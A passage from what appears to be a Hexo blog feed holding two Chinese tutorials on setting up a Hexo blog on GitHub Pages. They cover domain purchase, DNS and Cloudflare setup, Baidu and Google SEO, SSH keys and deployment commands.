title="域名"></a>域名</h3><p>1、购买域名<br>可以到freenom网站，使用免费域名（免费域名被他人购买风险）<br><a href="https://zhuanlan.zhihu.com/p/115535965">https://zhuanlan.zhihu.com/p/115535965</a></p><p>或注册pp.ua、eu.org、js.org等免费的二级域名<br>pp.ua申请教程<br><a href="https://v2xtls.org/%E5%85%8D%E8%B4%B9%E4%BA%8C%E7%BA%A7%E5%9F%9F%E5%90%8Dpp-ua%E7%94%B3%E8%AF%B7%E6%95%99%E7%A8%8B/">https://v2xtls.org/%E5%85%8D%E8%B4%B9%E4%BA%8C%E7%BA%A7%E5%9F%9F%E5%90%8Dpp-ua%E7%94%B3%E8%AF%B7%E6%95%99%E7%A8%8B/</a></p><p>eu.org申请教程<br><a href="https://www.cnblogs.com/Sky-seeker/p/14253687.html">https://www.cnblogs.com/Sky-seeker/p/14253687.html</a></p><p>在<a href="https://www.namesilo.com/?rid=d27fa32do">namesilo</a>购买一个便宜的域名</p><p>注册和激活账户<br><a href="https://www.namesilo.com/login">https://www.namesilo.com/login</a><br>密码规则为至少一个大写字母，一个小写字母，一个特殊符号和一个数字<br><a href="https://www.namesilo.com/account_profile.php">https://www.namesilo.com/account_profile.php</a></p><p>然后再到邮箱内确认<br><img src="/2021/08/09/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%882%EF%BC%89/8a81918421a74469a184ee8cf6a3e39e.png"></p><p>查找需要的域名<br><a href="https://www.namesilo.com/domain/search-domains?query=">https://www.namesilo.com/domain/search-domains?query=</a><br><img src="/2021/08/09/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%882%EF%BC%89/7a93a9fbacf34b8ba7059eec263a0587.png"></p><p>点击add然后checkout<br><img src="/2021/08/09/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%882%EF%BC%89/db69cf1127b1448fb7f2c5c82d5d70ad.png"></p><p>来到支付界面选微信支付<br>支付宝支付需要填写支付宝绑定的邮箱</p><p>退款参考<a href="https://www.vjsun.com/129.html">https://www.vjsun.com/129.html</a></p><p>在 DNS 设置部分，删除自带的记录，然后添加 CNAME 记录和A记录将 www 域名和根域名解析指向 用户名.github.io</p><p><img src="/2021/08/09/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%882%EF%BC%89/77198d8e809d4280968b1a1062b55995.png"></p><p>在设置前，首先把自带的几条默认记录全部删除（DELETE）</p><p><img src="/2021/08/09/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%882%EF%BC%89/ad0175df44274b6d98b1218d7b1f95ab.png"></p><p><img src="/2021/08/09/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%882%EF%BC%89/5673bcf3a0dc4a2abf3094aa3d42e82d.png"></p><ol start="2"><li>绑定域名到 Hexo 博客<br>然后打开你的github博客项目，点击settings，拉到下面Custom domain处，填上你自己的域名，保存：</li></ol><p>这时候你的项目根目录应该会出现一个名为CNAME的文件了。如果没有的话，打开你本地博客/source目录，新建CNAME文件，注意没有后缀。然后在里面写上你的域名，保存。最后运行hexo g、hexo d上传到github。</p><p><img src="/2021/08/09/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%882%EF%BC%89/d060ae67e46146009f77adc44ac8082b.png"></p><p>配置自己的域名后，需要我们手动开启 HTTPS。打开博客所在 GitHub 仓库，Settings -&gt; 下拉找到 GitHub Pages -&gt; 勾选 Enforce HTTPS。</p><ol start="3"><li>CloudFlare CDN 配置<br>先通过 <a href="https://dash.cloudflare.com/sign-up">https://dash.cloudflare.com/sign-up</a> 链接进行注册，然后添加站点（注意是填写域名），提交之后会自动扫描域名对应的解析记录，下一步就是激活了：通过域名的运营商修改对应的 NS 记录<br>cloudflare的dns配置应与dns的a记录配置和cname记录一致，否则github page会报域名错误<br><img src="/2021/08/09/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%882%EF%BC%89/8d430d025b9a42a29272c39a7867aba0.png"></li></ol><p><img src="/2021/08/09/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%882%EF%BC%89/b35a027dc034479f8d2689749f29d3e9.png"></p><p><img src="/2021/08/09/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%882%EF%BC%89/a0a3274ce6354ca6a79efd355698683e.png"></p><p><img src="/2021/08/09/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%882%EF%BC%89/2514559275dc45779b75600e38d9baa2.png"></p><p>将两个cloudflare ns写上去</p><p><img src="/2021/08/09/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%882%EF%BC%89/6fac2fa1206f49f991ac0f2673557343.png"></p><p>将cloudflare的选项全开<br><img src="/2021/08/09/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%882%EF%BC%89/52a52a807b8e4b12876bd246ee1c104f.png"></p><p>这样就设置完毕了，等一段时间再用命令行验证一下：<br>dig 15651.xyz +noall +answer</p><p>然后清除下浏览器 DNS 缓存，chrome 浏览器输入chrome://net-internals/#dns 进入清除页：<br><img src="/2021/08/09/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%882%EF%BC%89/9d9d4bf39d784e6694249212d1c9b1af.png"></p><p>再次访问域名，F12 打开网络面板可以看到已经用上了 CDN 了：</p><p><img src="/2021/08/09/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%882%EF%BC%89/9462ac1db09d42dd8b339ae862b254bf.png"></p><h2 id="网站SEO"><a href="#网站SEO" class="headerlink" title="网站SEO"></a>网站SEO</h2><h3 id="百度收录站点"><a href="#百度收录站点" class="headerlink" title="百度收录站点"></a>百度收录站点</h3><h4 id="验证网站所有权"><a href="#验证网站所有权" class="headerlink" title="验证网站所有权"></a>验证网站所有权</h4><p>登录百度站长搜索资源平台：<a href="http://zhanzhang.baidu.com,/">http://zhanzhang.baidu.com，</a> 只要有百度旗下的账号就可以登录，登录成功之后在站点管理中点击添加网站然后输入你的站点地址。</p><p>补充：github是不允许百度的spider爬取github上的内容</p><p>在填完网址选择完网站的类型之后需要验证网站的所有权，验证网站所有权的方式有三种：</p><ul><li>文件验证。</li><li>html标签验证</li><li>CNAME解析验证（推荐使用）</li></ul><h4 id="生成网站地图"><a href="#生成网站地图" class="headerlink" title="生成网站地图"></a>生成网站地图</h4><p>我们需要使用npm自动生成网站的sitemap，然后将生成的sitemap提交到百度和其他搜索引擎</p><ol><li><p>安装sitemap插件</p><figure class="highlight mipsasm"><table><tbody><tr><td class="code"><pre><span class="line">npm <span class="keyword">install </span>hexo-generator-sitemap --save     </span><br><span class="line">npm <span class="keyword">install </span>hexo-generator-<span class="keyword">baidu-sitemap </span>--save</span><br></pre></td></tr></tbody></table></figure></li><li><p>修改博客配置文件<br>在根目录配置文件.yml中修改url为你的站点地址</p></li></ol><figure class="highlight crmsh"><table><tbody><tr><td class="code"><pre><span class="line">vim _config.yml</span><br><span class="line"><span class="comment"># 自动生成sitemap</span></span><br><span class="line">sitemap:</span><br><span class="line">  path: sitemap.<span class="keyword">xml</span></span><br><span class="line"><span class="title">baidusitemap</span>:</span><br><span class="line">  path: baidusitemap.<span class="keyword">xml</span></span><br><span class="line"><span class="title"></span></span><br></pre></td></tr></tbody></table></figure><p>执行完hexo g命令之后就会在网站根目录生成sitemap.xml文件和baidusitemap.xml文件，可以通过：https://域名.com/baidusitemap.xml, 查看该文件是否生成，其中sitemap.xml文件是搜索引擎通用的文件，baidusitemap.xml是百度专用的sitemap文件。<br><img src="/2021/08/09/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%882%EF%BC%89/c706575b0ba847ada4ba112c1df502c6.png"></p><ol start="3"><li>向百度提交链接<br>然后我们就可以将我们生成的sitemap文件提交给百度，还是在百度站长平台，找到链接提交，这里我们可以看到有两种提交方式，自动提交和手动提交，自动提交又分为主动推送、自动推送和sitemap</li></ol><p>如何选择链接提交方式</p><blockquote><ol><li>主动推送：最为快速的提交方式，推荐您将站点当天新产出链接立即通过此方式推送给百度，以保证新链接可以及时被百度收录。</li><li>自动推送：最为便捷的提交方式，请将自动推送的JS代码部署在站点的每一个页面源代码中，部署代码的页面在每次被浏览时，链接会被自动推送给百度。可以与主动推送配合使用。</li><li>sitemap：您可以定期将网站链接放到sitemap中，然后将sitemap提交给百度。百度会周期性的抓取检查您提交的sitemap，对其中的链接进行处理，但收录速度慢于主动推送。</li><li>手动提交：一次性提交链接给百度，可以使用此种方式。<br>一般主动提交比手动提交效果好，这里介绍主动提交的三种方法</li></ol></blockquote><p>从效率上来说：</p><blockquote><p>主动推送&gt;自动推送&gt;sitemap</p></blockquote><ol start="4"><li>设置主动推送<br>安装插件hexo-baidu-url-submit</li></ol><p><code>npm install hexo-baidu-url-submit --save</code></p><p>然后再根目录的配置文件中新增字段</p><figure class="highlight dts"><table><tbody><tr><td class="code"><pre><span class="line"><span class="symbol">baidu_url_submit:</span></span><br><span class="line"><span class="symbol">  count:</span> <span class="number">80</span>             <span class="meta"># 提交最新的一个链接</span></span><br><span class="line"><span class="symbol">  host:</span> www.域名.com <span class="meta"># 在百度站长平台中注册的域名</span></span><br><span class="line"><span class="symbol">  token:</span> xxxxxxxxxxxxxx <span class="meta"># 请注意这是您的秘钥， 所以请不要把博客源代码发布在公众仓库里!</span></span><br><span class="line"><span class="symbol">  path:</span> baidu_urls.txt  <span class="meta"># 文本文档的地址， 新链接会保存在此文本文档里</span></span><br></pre></td></tr></tbody></table></figure><p>再加入新的deploy：</p><figure class="highlight elm"><table><tbody><tr><td class="code"><pre><span class="line"><span class="title">deploy</span>:</span><br><span class="line">- <span class="keyword">type</span>: baidu_url_submitter</span><br></pre></td></tr></tbody></table></figure><p>这样执行hexo deploy的时候，新的链接就会被推送了。</p><ol start="5"><li>设置自动推送<br>在主题配置文件下设置,将baidu_push设置为true:</li></ol><figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># Enable baidu push so that the blog will push the url to baidu automatically which is very helpful for SEO</span></span><br><span class="line"><span class="attr">baidu_push:</span> <span class="literal">true</span></span><br></pre></td></tr></tbody></table></figure><p>然后主题文件目录加入下面代码，一般在目录/themes/matery/layout/_partial中的head.ejs中加入下面JS代码</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line">&lt;% if (theme.baidu_push) { %&gt; </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"> </span></span><br><span class="line"><span class="javascript">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>{ </span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> bp = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>); </span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> curProtocol = <span class="built_in">window</span>.location.protocol.split(<span class="string">':'</span>)[<span class="number">0</span>]; </span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span> (curProtocol === <span class="string">'https'</span>) { </span></span><br><span class="line"><span class="javascript">bp.src = <span class="string">'https://zz.bdstatic.com/linksubmit/push.js'</span>; </span></span><br><span class="line"><span class="javascript">} </span></span><br><span class="line"><span class="javascript"><span class="keyword">else</span> { </span></span><br><span class="line"><span class="javascript">bp.src = <span class="string">'http://push.zhanzhang.baidu.com/push.js'</span>; </span></span><br><span class="line"><span class="javascript">} </span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> s = <span class="built_in">document</span>.getElementsByTagName(<span class="string">"script"</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">s.parentNode.insertBefore(bp, s);</span></span><br><span class="line"><span class="javascript">})();</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line">&lt;% } %&gt;</span><br></pre></td></tr></tbody></table></figure><p>这样每次访问博客中的页面就会自动向百度提交sitemap</p><ol start="6"><li>sitemap方式<br>将我们上一步生成的sitemap文件提交到百度就可以了~</li></ol><h3 id="让google收录站点"><a href="#让google收录站点" class="headerlink" title="让google收录站点"></a>让google收录站点</h3><p>google站点平台：<a href="https://www.google.com/webmasters/">https://www.google.com/webmasters/</a></p><ul><li>注册账号</li><li>验证站点</li><li>提交sitemap</li></ul><blockquote><p>向 google 添加 sitemap 后: 进入 Google Search Console - 抓取 - 站点地图,点击「添加/测试站点地图」,输入你的博客网址. 若无报错则站点地图提交成功</p></blockquote><p><img src="/2021/08/09/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%882%EF%BC%89/09237de3b4d440c3b37ca5a092097ab1.png"></p><p><img src="/2021/08/09/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%882%EF%BC%89/76110b1af52b453886a291c120935551.png"></p><p>html验证<br>下载google697d4285479e12db.html</p><p>本地文件夹打开,将这个文件放在你的blog目录\sources目录下,当然,这样还没完,如果直接放在sources目录就执行编译,你编译后只会得到一个这样的经过编译后的文件,Google会报错</p><p>所以需要改动一下google697d4285479e12db.html</p><figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">layout:</span> <span class="literal">false</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">google-site-verification:</span> <span class="string">google697d4285479e12db.html</span></span><br></pre></td></tr></tbody></table></figure><p><img src="/2021/08/09/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%882%EF%BC%89/54dbc0c6767f4c83acdd71bd6fdbf224.png"></p><p>dns验证<br><img src="/2021/08/09/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%882%EF%BC%89/92f27b2d2384405cb4661dc33fc189bd.png"></p><p><strong>提交 robots.txt:</strong></p><p>robots.txt 是一种存放于网站根目录下的 ASCII 编码的文本文件，它的作用是告诉搜索引擎此网站中哪些内容是可以被爬取的，哪些是禁止爬取的。robots.txt 放在博客目录下的 source 文件夹中，博客生成后在站点目录 /public/ 下。</p><figure class="highlight dts"><table><tbody><tr><td class="code"><pre><span class="line">User-agent: * </span><br><span class="line"><span class="symbol">Allow:</span> / </span><br><span class="line"><span class="symbol">Allow:</span> <span class="meta-keyword">/archives/</span> </span><br><span class="line"><span class="symbol">Allow:</span> <span class="meta-keyword">/categories/</span> </span><br><span class="line"><span class="symbol">Allow:</span> <span class="meta-keyword">/about/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/js/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/css/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/fonts/</span> </span><br><span class="line"><span class="symbol">Disallow:</span> <span class="meta-keyword">/vendors/</span></span><br></pre></td></tr></tbody></table></figure><p>robots.txt 文件更新至网站后可进入 Google Search Console - 抓取 - robots.txt 测试工具进行测试。</p><h2 id="正则修改小脚本"><a href="#正则修改小脚本" class="headerlink" title="正则修改小脚本"></a>正则修改小脚本</h2><p>由于本人使用joplin，导出md的图片则有笔记本自动生成的一串英文名字加地址。<br>而在本地上传后会显示出来，因此用脚本批量修改为空<br>python脚本</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os,re</span><br><span class="line">path =<span class="string">r'D:\OneDrive\Desktop\exchange/'</span> <span class="comment">#自己文件的路径</span></span><br><span class="line">file_list = os.listdir(path)</span><br><span class="line"><span class="built_in">print</span>(file_list)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> file_list:</span><br><span class="line">    name_suffix = re.search(<span class="string">r'.*?(\.md)$'</span>,i)<span class="comment">#取md后缀</span></span><br><span class="line">    <span class="keyword">if</span> name_suffix:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(path+i,<span class="string">'r'</span>,encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> f1,<span class="built_in">open</span>(path+<span class="string">"%s.bak"</span> % i, <span class="string">"w"</span>, encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> f2:</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> f1:</span><br><span class="line">                f2.write(re.sub(<span class="string">r'^!\[.*\]'</span>,<span class="string">'![]'</span>,line))</span><br><span class="line">        os.remove(path+i)</span><br><span class="line">        os.rename(path+<span class="string">"%s.bak"</span> % i,path+i)</span><br></pre></td></tr></tbody></table></figure><p>参考：<a href="https://sunhwee.com/posts/6e8839eb.html#toc-heading-45">https://sunhwee.com/posts/6e8839eb.html#toc-heading-45</a><br><a href="https://blog.csdn.net/q275343119/article/details/82765248">https://blog.csdn.net/q275343119/article/details/82765248</a><br><a href="https://www.cnblogs.com/wc-chan/p/8085452.html">https://www.cnblogs.com/wc-chan/p/8085452.html</a><br><a href="https://www.cnblogs.com/guixinchn/p/13549768.html">https://www.cnblogs.com/guixinchn/p/13549768.html</a><br><a href="https://liuruibin.com/posts/64eb.html">https://liuruibin.com/posts/64eb.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用Hexo和github搭建博客（1）</title>
      <link href="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/"/>
      <url>/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="利用Hexo和github搭建博客（1）"><a href="#利用Hexo和github搭建博客（1）" class="headerlink" title="利用Hexo和github搭建博客（1）"></a>利用Hexo和github搭建博客（1）</h1><p>利用git page搭建一个免费的博客</p><h2 id="01环境准备"><a href="#01环境准备" class="headerlink" title="01环境准备"></a>01环境准备</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><blockquote><p>1.安装git<br>官方地址：<a href="https://git-scm.com/">https://git-scm.com/</a></p></blockquote><ol><li><p>git官方地址，下载对应的安装包，进行安装（简单的点击下一步）。</p></li><li><p>安装好之后，鼠标右键可以看到：Git Bash Here，点击后打开了。</p></li><li><p>输入：git –version<br><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/ebaeb56472844b31b15de8347e5b238c.png"></p></li></ol><p>出现这个说明git安装成功。</p><blockquote><ol start="2"><li>安装node.js<br>官方地址：<a href="https://nodejs.org/en/download/">https://nodejs.org/en/download/</a></li></ol></blockquote><ol><li><p>访问nodejs官方地址，下载对应的安装包，进行安装（简单的点击下一步）。</p></li><li><p>安装好之后，配置环境变量，并在终端里面输入：node -v<br><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/b77c9014e3e74c74b9f131c3179fd46f.png"></p></li></ol><p>出现这个说明nodejs安装成功~</p><blockquote><p>3.安装Hexo<br>安装命令：npm install hexo -g<br><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/0e5d242438fb4ef08f95263d94294ed0.png"></p></blockquote><p>测试是否安装成功，命令：hexo -v</p><p><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/a4f69d1c7992418dad432f5f4f7ce085.png"></p><blockquote><p>4.安装hexo依赖<br>命令：npm install –save hexo-deployer-git</p></blockquote><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>以ubuntu举例</p><figure class="highlight routeros"><table><tbody><tr><td class="code"><pre><span class="line">apt-<span class="builtin-name">get</span> update</span><br><span class="line">apt-<span class="builtin-name">get</span> install nodejs</span><br><span class="line">apt-<span class="builtin-name">get</span> install npm</span><br><span class="line">apt install curl git vim</span><br></pre></td></tr></tbody></table></figure><p>如果报错,请更改软件源–清华大学开源软件源,并更新</p><blockquote><p>nodejs -v<br>npm -v</p></blockquote><figure class="highlight mipsasm"><table><tbody><tr><td class="code"><pre><span class="line">node.<span class="keyword">js版本过低就用nvm调整</span></span><br><span class="line"><span class="keyword"></span>nvm list</span><br><span class="line">nvm <span class="keyword">install </span>对应版本</span><br><span class="line">nvm ues 对应版本</span><br></pre></td></tr></tbody></table></figure><p>hexo</p><p>创建目录<br>mkdir hexo<br>切换目录<br>cd hexo<br>全局安装 Hexo，需要最高权限，记得输入root密码<br>sudo npm install -g hexo-cli<br>初始化 Hexo<br>hexo init</p><p>npm install </p><h2 id="02git配置SSH-key"><a href="#02git配置SSH-key" class="headerlink" title="02git配置SSH key"></a>02git配置SSH key</h2><p>SSH key 作用：<br>免密的将本地的源码和资源上传到github，无需要每次都输账号和密码。</p><p>先看本地是否配置好SSH key（命令：cd ~/.ssh）</p><p>因为ssh配置好之后是保存到 c:/用户/Administrator/.ssh</p><p>github与gitee操作基本一致</p><h3 id="1-配置ssh"><a href="#1-配置ssh" class="headerlink" title="1.配置ssh"></a>1.配置ssh</h3><blockquote><p>先生成ssh key<br>ssh-keygen -t rsa -C “邮件地址”<br>备注：这里的邮件地址是github账号绑定的邮件地址</p></blockquote><p>输入生成命令：ssh-keygen -t rsa -C “邮件地址”后。连续回车三次即可<br><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/6e155e69cea746d6ad6b196970ce2338.png"><br><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/c539bd8b404b430699d44adf66e51a69.png"><br>可以看到在用户文件夹下生成了一个ssh文件夹<br><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/3f0ab0a84e2f4f15851cd26f19040fff.png"></p><p>接着打开github主页，点击个人设置，点击左侧的SSH and GPG keys，点击New SSH key<br><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/b346e220fdf24bc4b655343af2775c16.png"><br>将id_rsa.pub复制的内容粘贴到key中，title随便起一个就行。点击 Add SSH key</p><blockquote><p>测试是否成功：<br>ssh -T <a href="mailto:git@github.com">git@github.com</a></p></blockquote><p><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/53de417e48954469bd5378c4189d8a00.png"></p><p>配置账号和密码</p><p>$ git config –global user.name “XXX” #你的github用户名<br>$ git config –global user.email “<a href="mailto:xxx@163.com">xxx@163.com</a>“ #填写你的github注册邮箱</p><p>备注：用户名和邮箱记得改为 自己的</p><h2 id="03-搭建个人博客"><a href="#03-搭建个人博客" class="headerlink" title="03 搭建个人博客"></a>03 搭建个人博客</h2><h3 id="1-新建博客"><a href="#1-新建博客" class="headerlink" title="1.新建博客"></a>1.新建博客</h3><p>开始之前先介绍一下heox的基本命令</p><figure class="highlight axapta"><table><tbody><tr><td class="code"><pre><span class="line">hexo <span class="keyword">new</span> <span class="string">"postName"</span> <span class="meta">#新建文章</span></span><br><span class="line">hexo <span class="keyword">new</span> page <span class="string">"pageName"</span> <span class="meta">#新建页面</span></span><br><span class="line">hexo generate <span class="meta">#生成静态页面至public目录</span></span><br><span class="line">hexo <span class="keyword">server</span> <span class="meta">#开启预览访问端口（默认端口4000，'ctrl + c'关闭server）</span></span><br><span class="line">hexo deploy <span class="meta">#部署到GitHub</span></span><br><span class="line">hexo help  <span class="meta"># 查看帮助</span></span><br><span class="line">hexo version  <span class="meta">#查看Hexo的版本</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p>对应的缩写，比如：<br>hexo n == hexo new<br>hexo g == hexo generate</p></blockquote><p>新建一个保存博客的存放目录，比如辰哥的是：D:\hexo</p><blockquote><p>进入到本地博客存放目录<br>初始化 个人博客<br>命令：hexo init<br><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/cf3b4a834bf048b9ab09871cce16cfc2.png"></p></blockquote><p>可以看到博客存放目录出现了如下内容：<br><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/e9d5d1e408d943e09534eded355791a6.png"></p><blockquote><p>生成静态网页<br>命令：hexo g<br>预览<br>命令：hexo s<br><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/ff17e7d58b024e5aaf30a2b7a01f2f0b.png"></p></blockquote><blockquote><p>报错解决：</p><p>问题：hexo g报错,line.mathALL is not funciton问题解决</p><p>原因：nodejs版本低于12</p><p>解决：两种方法</p><p>方法1）请将nodejs升级到高于12.0.0的版本</p><p>方法2）config.xml中的 highlight-&gt;enable的值从true更改为false，这样可以避免异常。</p><p>在浏览器这访问：<br><a href="http://localhost:4000/">http://localhost:4000/</a></p></blockquote><p><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/9d69d460235340579094830eb9532d3b.png"></p><p>可以看到访问没问题。</p><p>但这个只是在本地预览，接着将这个博客部署到github。</p><h3 id="2-部署到github-gitee"><a href="#2-部署到github-gitee" class="headerlink" title="2.部署到github/gitee"></a>2.部署到github/gitee</h3><p>gitee可以参考github<br>新建一个github仓库<br><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/1572c65ef1e14377be54f7fedc0bf30e.png"></p><p>备注：最好是github的用户名</p><p><img src="/2021/08/04/%E5%88%A9%E7%94%A8Hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%881%EF%BC%89/79156ef09f934d2cb9204c8417ae4eb3.png"></p><p>编辑_config.yml，_config.yml在博客存放目录下,实现github 与gitee同时推送</p><p>补充：github现在默认分支名为main，如果为了后期gitee和github双同步，可以在repository的setting中branches进行修改分支名</p><figure class="highlight dts"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta"># Deployment</span></span><br><span class="line"><span class="meta">## Docs: https:<span class="comment">//hexo.io/docs/one-command-deployment</span></span></span><br><span class="line"><span class="symbol">deploy:</span></span><br><span class="line"><span class="symbol">  type:</span> git</span><br><span class="line"><span class="symbol">  repository:</span> </span><br><span class="line"><span class="symbol">    github:</span> git@github.com:username/username.github.io.git</span><br><span class="line"><span class="symbol">    gitee:</span> git@gitee.com:username/username.git</span><br><span class="line"><span class="symbol">  branch:</span> master</span><br></pre></td></tr></tbody></table></figure><p>repository仓库地址改为自己的</p><p>branch看自己的github仓库是master还是main，辰哥这里是main，所以就填写main</p><blockquote><p>发布到github</p><p>命令：hexo d</p></blockquote><p>在浏览器访问<br><a href="https://greenleavesl.github.io/">https://greenleavesl.github.io/</a><br><img 